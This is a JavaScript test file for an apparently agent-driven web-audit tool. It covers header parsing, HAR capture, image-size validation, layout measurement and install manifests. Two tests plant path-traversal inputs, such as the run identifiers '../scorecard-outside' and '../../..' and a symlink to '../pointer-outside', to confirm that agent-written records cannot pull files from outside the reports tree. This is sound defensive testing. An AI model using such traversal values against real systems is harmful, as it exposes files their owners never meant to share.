    assert(emptyCsp.present === true, `a header sent with an empty value is still present: ${JSON.stringify(emptyCsp)}`);
    assert(
      emptyCsp.empty === true && emptyCsp.value === '',
      `an empty value must be recorded as its own state: ${JSON.stringify(emptyCsp)}`,
    );
    assert(
      emptyCsp.issues.includes('present but empty'),
      `an empty security header must not read as a pass: ${JSON.stringify(emptyCsp)}`,
    );
    assert(
      empty.securityHeaders['referrer-policy'].empty === true,
      `an empty referrer-policy is empty too: ${JSON.stringify(empty.securityHeaders['referrer-policy'])}`,
    );
    const controlHsts = empty.securityHeaders['strict-transport-security'];
    assert(
      controlHsts.present === true && controlHsts.empty === false && controlHsts.issues.length === 0,
      `a header sent with a value must read as neither absent nor empty: ${JSON.stringify(controlHsts)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The HAR path reads two header values out of the raw CDP objects: a request's
// content-type and a redirect's location. Both were looked up by one exact casing
// ('Content-Type', and only 'Location'/'location'), so any other casing was missed
// - the fetch API sends a lower-case name, and a server may send LOCATION in any
// case at all. Both now go through headerMap, the same lower-casing the rest of
// the HAR path uses (web-uplift-0w6).
async function testHarReadsRequestContentTypeAndRedirectLocationRegardlessOfCase() {
  const received = [];
  const page = (title, script = '') =>
    `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1></main>${script}</body></html>`;
  const postScript = `<script>fetch('/post',{method:'POST',headers:{'content-type':'application/json'},body:'{"a":1}'}).catch(()=>{})</script>`;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/post') {
      received.push(req.rawHeaders);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    if (path === '/redirect') {
      res.writeHead(302, { 'LOCATION': '/final', 'Content-Type': 'text/html' });
      res.end(page('redirect', postScript));
      return;
    }
    // A redirect response body is never executed, so the POST belongs to the page
    // the redirect lands on.
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page(path === '/final' ? 'final' : 'root', path === '/final' ? postScript : ''));
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    // Prove the fixtures: the redirect really leaves with an all-caps name, and the
    // POST really arrives with a lower-case one.
    const wire = await new Promise((resolve, reject) => {
      const request = http.get(`${base}/redirect`, (res) => {
        const names = res.rawHeaders.filter((_, index) => index % 2 === 0);
        res.resume();
        resolve(names);
      });
      request.on('error', reject);
    });
    assert(wire.includes('LOCATION'), `the redirect fixture must really send an all-caps header name: ${JSON.stringify(wire)}`);

    const out = join(tmp, 'har-header-case.har');
    await gather('har', `${base}/redirect`, { quiet: true, wait: 1200, out });
    const entries = JSON.parse(readFileSync(out, 'utf8')).log.entries;
    const redirect = entries.find((entry) => entry.response.status === 302);
    assert(redirect, `the redirect entry must be recorded: ${JSON.stringify(entries.map((entry) => entry.response.status))}`);
    assert(
      redirect.response.redirectURL === '/final',
      `a redirect location must be read whatever case its name arrives in: ${JSON.stringify(redirect.response.redirectURL)}`,
    );
    assert(received.length > 0, 'the fixture must have received the POST');
    assert(
      received[0].includes('content-type'),
      `the POST must really arrive with a lower-case header name: ${JSON.stringify(received[0])}`,
    );
    const post = entries.find((entry) => entry.request.method === 'POST');
    assert(post, `the POST entry must be recorded: ${JSON.stringify(entries.map((entry) => entry.request.method))}`);
    assert(
      post.request.postData?.mimeType === 'application/json',
      `a request content-type must be read whatever case its name arrives in: ${JSON.stringify(post.request.postData)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The comparison record is untrusted input: it is written by an agent whose context
// includes page content. Its run identifiers are joined into the directory the
// before/after screenshots are read from, so they become the BASE for those reads -
// and `join` normalises a `..` in them BEFORE the path containment check runs, so
// that check validates the screenshot path against a base the record itself chose.
// The earlier artifact-path fix validated the PATH; this validates the BASE
// (web-uplift-9li).
async function testScorecardRejectsEscapingComparisonRunIds() {
  const { renderScorecard, scoreReport } = await import('../aggregate/scorecard.mjs');
  const hostRoot = join(tmp, 'scorecard-runs', 'example');
  // Bytes that must never reach the published report, sitting one level above the
  // host's run directory - exactly where a record-supplied `..` points.
  const outsideDir = join(hostRoot, '..', 'scorecard-outside');
  const secret = Buffer.from('SECRET-BYTES-FROM-OUTSIDE-THE-REPORTS-TREE');
  mkdirSync(outsideDir, { recursive: true });
  writeFileSync(join(outsideDir, 'secret.png'), secret);

  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  const runIds = ['20260101-000000', '20260102-000000'];
  const dirs = runIds.map((id) => join(hostRoot, id));
  mkdirSync(hostRoot, { recursive: true });
  dirs.forEach((dir, index) => {
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'report.json'), JSON.stringify(report));
    writeFileSync(join(dir, index === 0 ? 'before.png' : 'after.png'), Buffer.from(`screenshot-bytes-${index}`));
  });
  const data = (compare) => ({
    host: 'example',
    generatedAt: '2026-01-01 00:00',
    runs: runIds.map((runId, index) => ({ runId, dir: dirs[index], report, compare: null, ...scoreReport(report) })),
    latest: { runId: runIds[1], dir: dirs[1], report, compare, ...scoreReport(report) },
  });

  // Positive control: a comparison naming its two sibling runs still renders both.
  const ok = renderScorecard(data({
    runA: runIds[0],
    runB: runIds[1],
    metrics: [],
    summary: {},
    screenshotPairs: [{ before: 'before.png', after: 'after.png', caption: 'hero' }],
  }));
  assert(
    (ok.match(/data:image\/png;base64,/g) || []).length === 2,
    "scorecard: a normal comparison must still render both runs' screenshots",
  );

  // The attack: an identifier that climbs out of the host's run directory must be
  // refused rather than used as the base, so bytes from outside never reach the report.
  const escaped = renderScorecard(data({
    runA: '../scorecard-outside',
    runB: '../../..',
    metrics: [],
    summary: {},
    screenshotPairs: [{ before: 'secret.png', after: 'secret.png', caption: 'evil' }],
  }));
  assert(
    !escaped.includes(secret.toString('base64')),
    'scorecard: a record-supplied run identifier must not read outside the reports tree',
  );
  // A comparison record with no identifiers at all used to throw from join().
  const noIds = renderScorecard(data({ metrics: [], summary: {}, screenshotPairs: [{ before: 'before.png', after: 'after.png', caption: 'no ids' }] }));
  assert(
    !noIds.includes(secret.toString('base64')),
    'scorecard: a comparison with no run identifiers must not read outside the reports tree',
  );
}

// The report inlines its screenshots as data URIs, so the browser takes no network
// hop that could tell it the size: unless the image element carries its width and
// height, its box is zero high until the bitmap decodes and everything below it moves
// when it does. This checks, structurally, the sizes the renderer derives from the
// bytes for every format it claims to handle, the shapes it must refuse, and the
// stylesheet that lets those sizes reserve the box. It does NOT measure the box in a
// browser; that needs a fixture whose image is visible and not yet fetched, which is
// web-uplift-x4d (web-uplift-xq5).
async function testScorecardReservesImageBoxes() {
  const { renderScorecard, scoreReport } = await import('../aggregate/scorecard.mjs');
  const { evaluate, sleep, withSession } = await import('../evidence/cdp.mjs');

  const root = join(tmp, 'xq5-runs');
  const runIds = ['20260101-000000', '20260102-000000'];
  const dirs = runIds.map((id) => join(root, id));
  dirs.forEach((dir) => mkdirSync(dir, { recursive: true }));
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  // Byte shapes the browser cannot be asked to produce here, plus the malformed and
  // truncated ones whose whole point is that they must NOT yield a size.
  const pngHeader = (w, h) => Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0, 0, 0, 13]),
    Buffer.from('IHDR', 'latin1'),
    (() => { const b = Buffer.alloc(8); b.writeUInt32BE(w, 0); b.writeUInt32BE(h, 4); return b; })(),
    Buffer.from([8, 6, 0, 0, 0]),
    Buffer.alloc(4),
  ]);
  const webpVp8l = (w, h) => {
    const b = Buffer.alloc(40);
    b.write('RIFF', 0, 'latin1');
    b.writeUInt32LE(32, 4);
    b.write('WEBP', 8, 'latin1');
    b.write('VP8L', 12, 'latin1');
    b.writeUInt32LE(20, 16);
    b[20] = 0x2f;
    b.writeUInt32LE((w - 1) | ((h - 1) << 14), 21);
    return b;
  };
  const gif = (() => {
    const g = Buffer.alloc(16);
    g.write('GIF89a', 0, 'latin1');
    g.writeUInt16LE(64, 6);
    g.writeUInt16LE(48, 8);
    return g;
  })();
  // Which fixtures are real and which are not, since it matters: the PNG, JPEG and
  // WebP below are produced by Chrome's own encoder, and the fill-byte JPEG is a real
  // encoded JPEG with padding injected before its start-of-frame. The GIF is synthetic
  // because this environment has no GIF encoder, and the VP8L, the two counterexamples
  // and the malformed files are synthetic because the malformed ones cannot come from
  // an encoder by definition.
  writeFileSync(join(dirs[0], 'plain.gif'), gif);
  writeFileSync(join(dirs[1], 'vp8l.webp'), webpVp8l(130, 70));
  // Malformed or truncated: a PNG signature with no IHDR, a GIF too short to hold a
  // logical screen descriptor, a JPEG that ends inside its frame header, a WebP whose
  // lossy frame sync code is wrong, and bytes that are not an image at all.
  writeFileSync(join(dirs[0], 'bad.png'), pngHeader(400, 250).subarray(0, 16));
  writeFileSync(join(dirs[0], 'bad.gif'), Buffer.from('GIF89aabc', 'latin1'));
  writeFileSync(join(dirs[0], 'bad.jpg'), Buffer.from([0xff, 0xd8, 0xff, 0xc0, 0x00, 0x11, 0x08, 0x00]));
  writeFileSync(join(dirs[1], 'bad.webp'), (() => {
    const b = Buffer.alloc(40);
    b.write('RIFF', 0, 'latin1');
    b.writeUInt32LE(32, 4);
    b.write('WEBP', 8, 'latin1');
    b.write('VP8 ', 12, 'latin1');
    b.writeUInt32LE(20, 16);
    return b;
  })());
  // The reviewer's two counterexamples for this round: a chunk whose declared extent
  // runs past its own container, and a start-of-frame whose declared length cannot hold
  // the component entries it claims.
  writeFileSync(join(dirs[0], 'oversized-chunk.webp'), (() => {
    const b = Buffer.alloc(40);
    b.write('RIFF', 0, 'latin1');
    b.writeUInt32LE(32, 4);
    b.write('WEBP', 8, 'latin1');
    b.write('VP8X', 12, 'latin1');
    b.writeUInt32LE(9999, 16);
    b.writeUIntLE(5, 24, 3);
    b.writeUIntLE(5, 27, 3);
    return b;
  })());
  writeFileSync(join(dirs[0], 'short-sof-components.jpg'), Buffer.from([0xff, 0xd8, 0xff, 0xc0, 0x00, 0x08, 0x08, 0x00, 0x0b, 0x00, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00]));
  // A PNG whose declared chunk is not fully present: 24 bytes carry the signature, the
  // chunk length and type, and the dimension fields, but the rest of the 13-byte IHDR
  // data and its checksum are missing. The earlier check accepted this on length alone
  // and read dimensions out of a chunk the file does not contain.
  writeFileSync(join(dirs[0], 'short-ihdr.png'), pngHeader(400, 250).subarray(0, 24));
  // A WebP whose container declares four bytes, so the chunk header sits outside the
  // range the container claims. This is a BEHAVIOUR PIN and not a regression test for the
  // guard added alongside it: the chunk-extent check further down already rejects this
  // input, so the outcome is the same with and without that guard. It is here because the
  // invariant should hold independently of which guard enforces it.
  writeFileSync(join(dirs[0], 'malformed-container.webp'), (() => {
    const b = Buffer.alloc(34);
    b.write('RIFF', 0, 'latin1');
    b.writeUInt32LE(4, 4);
    b.write('WEBP', 8, 'latin1');
    b.write('VP8X', 12, 'latin1');
    b.writeUInt32LE(10, 16);
    b.writeUIntLE(5, 24, 3);
    b.writeUIntLE(5, 27, 3);
    return b;
  })());
  writeFileSync(join(dirs[0], 'junk.png'), Buffer.from('not an image at all'));
  // The two counterexamples from the review: shapes the EARLIER parser sized from
  // bytes the file does not claim to contain, which is what makes these fixtures
  // distinguish validation from its absence. A start-of-frame whose declared segment
  // length (2) cannot hold the dimension fields the old walk read past its end, and a
  // RIFF container declaring size 0 while the fields sit at offsets 24-29.
  writeFileSync(
    join(dirs[0], 'short-sof.jpg'),
    Buffer.from([0xff, 0xd8, 0xff, 0xc0, 0x00, 0x02, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),
  );
  writeFileSync(join(dirs[0], 'undersized-riff.webp'), (() => {
    const b = Buffer.alloc(30);
    b.write('RIFF', 0, 'latin1');
    b.writeUInt32LE(0, 4);
    b.write('WEBP', 8, 'latin1');
    b.write('VP8X', 12, 'latin1');
    b.writeUInt32LE(10, 16);
    return b;
  })());

  await withSession(async (client) => {
    const encode = async (type, w, h) => {
      const url = await evaluate(client, `(() => { const c = document.createElement('canvas'); c.width = ${w}; c.height = ${h}; const x = c.getContext('2d'); x.fillStyle = '#123456'; x.fillRect(0, 0, ${w}, ${h}); return c.toDataURL('${type}'); })()`);
      return Buffer.from(String(url).split(',')[1], 'base64');
    };
    writeFileSync(join(dirs[0], 'before.png'), await encode('image/png', 400, 250));
    // A real JPEG with marker FILL bytes injected before its start-of-frame: the fill
    // path exercised on a structurally valid image rather than on hand-built arithmetic,
    // and it stays decodable, which the browser is asked to confirm below.
    const realJpeg = await encode('image/jpeg', 222, 111);
    const sofAt = (() => {
      for (let i = 2; i + 3 < realJpeg.length; i += 1) {
        if (realJpeg[i] !== 0xff) continue;
        const marker = realJpeg[i + 1];
        if (marker >= 0xc0 && marker <= 0xcf && marker !== 0xc4 && marker !== 0xc8 && marker !== 0xcc) return i;
      }
      return -1;
    })();
    assert(sofAt > 0, 'xq5: the encoded JPEG must contain a start-of-frame to pad before');
    const fillJpeg = Buffer.concat([realJpeg.subarray(0, sofAt), Buffer.from([0xff, 0xff, 0xff]), realJpeg.subarray(sofAt)]);
    writeFileSync(join(dirs[0], 'fill.jpg'), fillJpeg);
    const decodedFill = await evaluate(
      client,
      `(async () => { const i = new Image(); i.src = ${JSON.stringify('data:image/jpeg;base64,' + fillJpeg.toString('base64'))}; await i.decode(); return { w: i.naturalWidth, h: i.naturalHeight }; })()`,
    );
    assert(
      decodedFill.w === 222 && decodedFill.h === 111,
      `xq5: the fill-byte fixture must be a real decodable JPEG of 222x111, got ${JSON.stringify(decodedFill)}`,
    );
    writeFileSync(join(dirs[1], 'after.jpg'), await encode('image/jpeg', 300, 180));
    writeFileSync(join(dirs[1], 'extra.webp'), await encode('image/webp', 200, 120));
    // A screenshot attached to a finding: the third emission site, inside the finding
    // dialog, which the pair and gallery sites do not cover. It is written into the
    // latest run's directory because that is the one the dialogs render from.
    const dialogPng = await encode('image/png', 111, 77);
    for (const dir of dirs) writeFileSync(join(dir, 'dialog.png'), dialogPng);
    const evidenceReport = {
      ...report,
      __runId: 'xq5',
      artifacts: [{ path: 'dialog.png', type: 'screenshot', caption: 'dialog evidence', findingIds: [report.findings[0].id] }],
    };

    // The report is shared by both runs, but each side of a pair resolves against its
    // OWN run directory, so every fixture is placed in both.
    for (const dir of dirs) {
      for (const other of dirs) {
        if (dir === other) continue;
        for (const name of readdirSync(other)) {
          if (!existsSync(join(dir, name))) writeFileSync(join(dir, name), readFileSync(join(other, name)));
        }
      }
    }

    const compare = {
      runA: runIds[0],
      runB: runIds[1],
      metrics: [],
      summary: {},
      screenshotPairs: [
        { before: 'before.png', after: 'after.jpg', caption: 'real PNG and JPEG' },
        { before: 'plain.gif', after: 'extra.webp', caption: 'GIF header and real WebP' },
        { before: 'fill.jpg', after: 'vp8l.webp', caption: 'JPEG fill bytes and VP8L' },
        { before: 'bad.png', after: 'before.png', caption: 'truncated PNG' },
        { before: 'bad.gif', after: 'fill.jpg', caption: 'truncated GIF' },
        { before: 'bad.jpg', after: 'vp8l.webp', caption: 'truncated JPEG' },
        { before: 'bad.webp', after: 'after.jpg', caption: 'bad WebP sync' },
        { before: 'short-ihdr.png', after: 'after.jpg', caption: 'chunk not fully present' },
        { before: 'malformed-container.webp', after: 'after.jpg', caption: 'container smaller than its chunk header' },
        { before: 'junk.png', after: 'after.jpg', caption: 'not an image' },
        { before: 'short-sof.jpg', after: 'before.png', caption: 'segment too short for its fields' },
        { before: 'undersized-riff.webp', after: 'after.jpg', caption: 'container too small for its fields' },
        { before: 'oversized-chunk.webp', after: 'after.jpg', caption: 'chunk extends past its container' },
        { before: 'short-sof-components.jpg', after: 'before.png', caption: 'frame cannot hold its components' },
        { before: 'missing.png', after: 'after.jpg', caption: 'absent file' },
        // Neither side readable: the pair is dropped, which is the production rule and
        // was left uncovered when this test was rewritten.
        { before: 'missing.png', after: 'also-missing.png', caption: 'nothing-readable' },
      ],
    };
    const html = renderScorecard({
      host: 'example',
      generatedAt: '2026-01-01 00:00',
      runs: runIds.map((runId, index) => ({ runId, dir: dirs[index], report: evidenceReport, compare: index === 1 ? compare : null, ...scoreReport(evidenceReport) })),
      latest: { runId: runIds[1], dir: dirs[1], report: evidenceReport, compare, ...scoreReport(evidenceReport) },
    });

    // Every readable image carries the size read from its own bytes. PNG, JPEG and
    // WebP here are real encoder output; the GIF, the JPEG with fill bytes and the
    // VP8L file are the shapes the browser cannot be asked to produce.
    for (const [label, size] of [
      ['PNG', ' width="400" height="250"'],
      ['JPEG', ' width="300" height="180"'],
      ['GIF', ' width="64" height="48"'],
      ['WebP', ' width="200" height="120"'],
      ['JPEG with fill bytes', ' width="222" height="111"'],
      ['WebP VP8L', ' width="130" height="70"'],
      ['the finding-dialog screenshot', ' width="111" height="77"'],
    ]) {
      assert(html.includes(size), `xq5: the rendered markup must carry the ${label} size, missing ${JSON.stringify(size)}`);
    }
    // ...and nothing unreadable gets one. Each malformed fixture still renders as an
    // image, so the tag carrying those exact bytes is the thing to check: it must not
    // have been given a size.
    const escRe = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    for (const [name, ext, bytes] of [
      ['bad.png', 'png', readFileSync(join(dirs[0], 'bad.png'))],
      ['bad.gif', 'gif', readFileSync(join(dirs[0], 'bad.gif'))],
      ['bad.jpg', 'jpeg', readFileSync(join(dirs[0], 'bad.jpg'))],
      ['bad.webp', 'webp', readFileSync(join(dirs[1], 'bad.webp'))],
      ['junk.png', 'png', readFileSync(join(dirs[0], 'junk.png'))],
      ['short-ihdr.png', 'png', readFileSync(join(dirs[0], 'short-ihdr.png'))],
      ['malformed-container.webp', 'webp', readFileSync(join(dirs[0], 'malformed-container.webp'))],
      ['short-sof.jpg', 'jpeg', readFileSync(join(dirs[0], 'short-sof.jpg'))],
      ['undersized-riff.webp', 'webp', readFileSync(join(dirs[0], 'undersized-riff.webp'))],
      ['oversized-chunk.webp', 'webp', readFileSync(join(dirs[0], 'oversized-chunk.webp'))],
      ['short-sof-components.jpg', 'jpeg', readFileSync(join(dirs[0], 'short-sof-components.jpg'))],
    ]) {
      const src = `src="data:image/${ext};base64,${bytes.toString('base64')}"`;
      const tag = html.match(new RegExp(`<img[^>]*${escRe(src)}[^>]*>`))?.[0];
      assert(tag, `xq5: ${name} must still render as an image`);
      assert(!tag.includes('width="'), `xq5: ${name} is not readable, so it must carry no size, got: ${tag.slice(0, 140)}`);
    }
    assert(
      (html.match(/<div class="noimg">n\/a<\/div>/g) || []).length === 1,
      'xq5: a side with nothing to show must still render the placeholder',
    );
    assert(!html.includes('nothing-readable'), 'xq5: a pair with nothing readable on either side must stay dropped');
    for (const rule of ['.media img,.media video{width:100%;height:auto;', '.ba-pair img{width:100%;height:auto;']) {
      assert(html.includes(rule), `xq5: the stylesheet must let the reserved box follow the image ratio, missing ${JSON.stringify(rule)}`);
    }
  });
}

// The report's inlined screenshots carry a size so the layout can reserve their box
// before the bitmap arrives. xq5 shipped the structural half of that; this measures the
// behaviour in a browser, and it measures BOTH shapes so the apparatus is proven able to
// see the difference: an image carrying the size attributes keeps the content below it
// still while its bitmap is in flight, and the same image without them shifts that
// content when the bitmap lands.
//
// Purpose-built because three earlier attempts could not establish it: a source-less
// clone (Chrome gives such an image no aspect ratio), a deliberately slow response (the
// page's load event waits for it, and the reading came back at zero geometry) and the
// scorecard's own imagery (a hidden tab panel never requests a lazy image, and a closed
// dialog never lays one out). So the fixture is a minimal page whose two images are in
// the normal flow, whose image rules are the REPORT'S OWN extracted from its stylesheet
// rather than a copy, and whose requests are held at the CDP layer so both bitmaps are
// genuinely in flight at the first reading (web-uplift-x4d).
async function testReservedImageBoxInBrowser() {
  const { evaluate, sleep, withSession } = await import('../evidence/cdp.mjs');
  const { renderScorecard, scoreReport } = await import('../aggregate/scorecard.mjs');

  // The report's stylesheet, so the measurement is of what ships and not of a copy of it.
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  const run = { runId: 'x4d', dir: tmp, report, compare: null, ...scoreReport(report) };
  const html = renderScorecard({ host: 'example', generatedAt: '2026-01-01 00:00', runs: [run], latest: run });
  const style = html.match(/<style>([\s\S]*?)<\/style>/)?.[1];
  assert(style && style.includes('.ba-pair img') && style.includes('.media img'), 'x4d: the report stylesheet must carry the two image rules');

  const reader = `(() => {
    const read = (imgId, markerId) => {
      const img = document.getElementById(imgId);
      const marker = document.getElementById(markerId);
      return { height: img.getBoundingClientRect().height, pending: !img.complete, decoded: img.complete && img.naturalWidth > 0, markerTop: marker.getBoundingClientRect().top };
    };
    return { ready: document.readyState, sized: read('withSize', 'markerA'), unsized: read('withoutSize', 'markerB') };
  })()`;

  const measured = await withSession(async (client) => {
    const encoded = await evaluate(client, `(() => { const c = document.createElement('canvas'); c.width = 400; c.height = 250; const x = c.getContext('2d'); x.fillStyle = '#123456'; x.fillRect(0, 0, 400, 250); return c.toDataURL('image/png'); })()`);
    const png = Buffer.from(String(encoded).split(',')[1], 'base64');
    // The report's own rules, plus a marker element after each block so the movement of
    // the content below an image is measurable.
    const page = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>reserved box</title><style>${style}
      body{margin:0;font:16px sans-serif} .x4d-pane{width:400px} .x4d-marker{height:24px;background:#eee}
    </style></head><body>
      <div class="x4d-pane media"><figure><img id="withSize" width="400" height="250" src="/shot-a.png" alt="with size"><figcaption>sized</figcaption></figure></div>
      <div class="x4d-marker" id="markerA">below the sized image</div>
      <div class="x4d-pane ba-pair"><figure><img id="withoutSize" src="/shot-b.png" alt="without size"></figure></div>
      <div class="x4d-marker" id="markerB">below the unsized image</div>
    </body></html>`;
    const server = http.createServer((req, res) => {
      if ((req.url || '').startsWith('/shot-a.png') || (req.url || '').startsWith('/shot-b.png')) {
        res.writeHead(200, { 'Content-Type': 'image/png' });
        res.end(png);
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(Buffer.from(page));
    });
    await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
    try {
      const url = `http://127.0.0.1:${server.address().port}/`;
      // Hold both image requests: while they are paused the bitmaps are certainly in
      // flight and the layout is settled, so the first reading is the pre-decode state.
      await client.Fetch.enable({ patterns: [{ urlPattern: '*shot-*.png*', requestStage: 'Request' }] });
      const held = [];
      client.Fetch.requestPaused((event) => { held.push(event.requestId); });
      await client.Page.navigate({ url });
      for (let i = 0; i < 60 && (held.length < 2 || (await evaluate(client, 'document.readyState')) === 'loading'); i += 1) await sleep(50);
      assert(held.length === 2, `x4d: both images must be in flight at the first reading, held ${held.length}`);
      const pending = await evaluate(client, reader);
      for (const requestId of held) await client.Fetch.continueRequest({ requestId });
      await client.Fetch.disable();
      for (let i = 0; i < 60; i += 1) {
        const done = await evaluate(client, `document.getElementById('withSize').complete && document.getElementById('withoutSize').complete`);
        if (done) break;
        await sleep(50);
      }
      const decoded = await evaluate(client, reader);
      return { pending, decoded };
    } finally {
      await new Promise((resolveClose) => server.close(resolveClose));
    }
  });

  // The page is parsed and both bitmaps really were in flight: without these the
  // measurement could be of an empty document, which is how an earlier attempt read zero.
  assert(['interactive', 'complete'].includes(measured.pending.ready), `x4d: the document must be parsed at the first reading, got ${measured.pending.ready}`);
  assert(measured.pending.sized.pending === true && measured.pending.unsized.pending === true, `x4d: both bitmaps must be pending at the first reading, got ${JSON.stringify(measured.pending)}`);
  assert(measured.decoded.sized.decoded === true && measured.decoded.unsized.decoded === true, `x4d: both bitmaps must have arrived by the second reading, got ${JSON.stringify(measured.decoded)}`);

  // The shape the fix ships: the box is reserved before the bitmap arrives, and the
  // content below it does not move.
  assert(measured.pending.sized.height > 0, `x4d: an image with size attributes must reserve a box while pending, got ${measured.pending.sized.height}px`);
  assert(
    Math.abs(measured.pending.sized.height - measured.decoded.sized.height) < 1,
    `x4d: the reserved box must equal the decoded box, got ${measured.pending.sized.height}px then ${measured.decoded.sized.height}px`,
  );
  assert(
    Math.abs(measured.pending.sized.markerTop - measured.decoded.sized.markerTop) < 1,
    `x4d: content below a sized image must not move when the bitmap arrives, got ${measured.pending.sized.markerTop} then ${measured.decoded.sized.markerTop}`,
  );

  // The shape before the fix, which is what proves the apparatus can see the difference.
  // Its pending height is not zero: the report's own rule puts a 1px border on the image,
  // and a border is the one part of the box that does not depend on the bitmap. What
  // matters is that it reserves essentially none of the height it will occupy.
  assert(
    measured.pending.unsized.height < 0.1 * measured.decoded.unsized.height,
    `x4d: an image with no size attributes must reserve essentially nothing while pending, got ${measured.pending.unsized.height}px of ${measured.decoded.unsized.height}px`,
  );
  // The movement is most of the image's height rather than all of it: while the bitmap is
  // missing the inline-block figure still occupies its baseline line box, so the shift is
  // the image's height less that line box. Tying the bound to the measured height keeps
  // the assertion independent of font metrics.
  const unsizedShift = measured.decoded.unsized.markerTop - measured.pending.unsized.markerTop;
  assert(
    unsizedShift > 0.5 * measured.decoded.unsized.height,
    `x4d: content below an unsized image must move by most of that image's height when the bitmap arrives, moved ${unsizedShift.toFixed(1)}px of ${measured.decoded.unsized.height}px - without this contrast the measurement would not show it can see the difference`,
  );

  // The numbers, so the gate log carries them rather than only the verdict.
  console.log(
    `[x4d] sized: ${measured.pending.sized.height}px pending -> ${measured.decoded.sized.height}px decoded, marker moved ` +
      `${(measured.decoded.sized.markerTop - measured.pending.sized.markerTop).toFixed(1)}px | unsized: ` +
      `${measured.pending.unsized.height}px pending -> ${measured.decoded.unsized.height}px decoded, marker moved ` +
      `${(measured.decoded.unsized.markerTop - measured.pending.unsized.markerTop).toFixed(1)}px`,
  );
}

// The `latest` pointer is a file in a tree the audited agent can write, and a consumer
// reads it as the directory to load a run's report from. A planted target must not be able
// to name a directory outside the host's run root (web-uplift-9t8), and EACH pointer form
// has its own positive control.
//
// The positive controls are written so that only a working pointer resolution can satisfy
// them: the tree holds two runs and the pointer names the OLDER one, while the fallback
// returns the newest by name. A branch that resolves nothing - or one masked by a leftover
// pointer of the other form - returns the newest run and fails the assertion, which is the
// distinction a negative-only test cannot make (web-uplift-uz9).
async function testLatestPointerCannotEscapeTheRunRoot() {
  const { resolveLatest } = await import('../runner/run-history.mjs');
  const hostRoot = join(tmp, 'pointer-host');
  const older = join(hostRoot, '20260101-000000');
  const newest = join(hostRoot, '20260102-000000');
  const outside = join(tmp, 'pointer-outside');
  for (const dir of [older, newest, outside]) {
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'report.json'), '{}');
  }

  // Positive control, text form: names the OLDER run, so the fallback cannot satisfy it.
  writeFileSync(join(hostRoot, 'latest.txt'), '20260101-000000\n');
  assert(
    resolveLatest(hostRoot) === older,
    `pointer: a legitimate text pointer must resolve to its run dir, got ${resolveLatest(hostRoot)}`,
  );

  // Negative, text form: parent segments must not escape the run root.
  writeFileSync(join(hostRoot, 'latest.txt'), '../pointer-outside\n');
  const escapedTxt = resolveLatest(hostRoot);
  assert(
    escapedTxt !== outside && !String(escapedTxt ?? '').includes('pointer-outside'),
    `pointer: a planted latest.txt must not resolve outside the run root, got ${escapedTxt}`,
  );

  // Positive control, symlink form: the text pointer is removed first, so a symlink branch
  // that resolves nothing cannot be masked by it and cannot lean on the fallback.
  rmSync(join(hostRoot, 'latest.txt'), { force: true });
  rmSync(join(hostRoot, 'latest'), { force: true });
  symlinkSync('20260101-000000', join(hostRoot, 'latest'), 'dir');
  assert(
    resolveLatest(hostRoot) === older,
    `pointer: a legitimate symlink pointer must resolve to its run dir, got ${resolveLatest(hostRoot)}`,
  );

  // Negative, symlink form: the planted target is refused.
  rmSync(join(hostRoot, 'latest'), { force: true });
  symlinkSync('../pointer-outside', join(hostRoot, 'latest'), 'dir');
  const escapedLink = resolveLatest(hostRoot);
  assert(
    escapedLink !== outside && !String(escapedLink ?? '').includes('pointer-outside'),
    `pointer: a planted symlink must not resolve outside the run root, got ${escapedLink}`,
  );

  // ...and a refused pointer falls back to the newest run INSIDE the tree, not to the
  // directory the pointer named.
  assert(
    escapedLink === newest,
    `pointer: a refused pointer must fall back to a run inside the tree, got ${escapedLink}`,
  );
}

function testInstalledEvidenceCli() {
  const target = join(tmp, 'installed-target');
  const tarball = packTarball();
  const install = run('npm', [
    'exec',
    '--yes',
    '--package',
    tarball,
    '--',
    'web-uplift',
    'install',
    '--agent',
    'codex',
    '--target',
    target,
  ], { env: noUpdateEnv() });
  assert(install.status === 0, `install failed: ${install.stderr || install.stdout}`);

  const manifest = JSON.parse(readFileSync(join(target, '.web-uplift/manifest.json'), 'utf8'));
  const pkg = readJson('package.json');
  assert(manifest.package === pkg.name, `installed manifest package mismatch: ${JSON.stringify(manifest)}`);
  assert(manifest.version === pkg.version, `installed manifest version mismatch: ${JSON.stringify(manifest)}`);
  assert(manifest.agents.includes('codex'), `installed manifest missed selected agent: ${JSON.stringify(manifest)}`);

  // The install vendors a dependency tree into the consumer's project, and those
  // packages are in no consumer lockfile, so the manifest is the only place that
  // says which versions are on disk. The record has to be TRUE, not just present:
  // every version it names must match what was actually copied (web-uplift-92b).
  const vendored = manifest.vendoredDependencies;
  assert(
    Array.isArray(vendored) && vendored.length > 0,
    `installed manifest must record the vendored dependency versions: ${JSON.stringify(manifest)}`,
  );
  const names = vendored.map((entry) => entry.name);
  assert(
    names.includes('chrome-remote-interface') && names.includes('web-features'),
    `both vendored roots must be recorded: ${JSON.stringify(names)}`,
  );
  assert(
    [...names].sort().join(',') === names.join(','),
